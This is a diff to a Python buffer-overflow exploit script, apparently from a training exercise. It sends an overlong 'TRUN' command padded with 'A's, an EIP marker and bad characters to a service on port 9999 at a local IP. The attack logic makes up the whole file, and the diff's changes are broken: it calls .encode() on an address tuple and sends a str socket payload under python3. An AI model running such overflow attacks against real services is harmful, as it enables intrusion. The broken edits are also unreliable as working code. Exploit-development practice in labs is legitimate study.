@@ -1,4 +1,4 @@
-#!/usr/bin/python
+#!/usr/bin/python3
 import sys, socket
 
 # Mostly the same as 3.py
@@ -21,7 +21,8 @@ shellcode = "A" * 2003 + "B" * 4 + badchars
 
 try:
     s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
-    s.connect(('192.168.0.143',9999))
+    payload = "192.168.0.143",9999
+    s.connect((payload.encode()))
     s.send(('TRUN /.:/' + shellcode))
     s.close
 
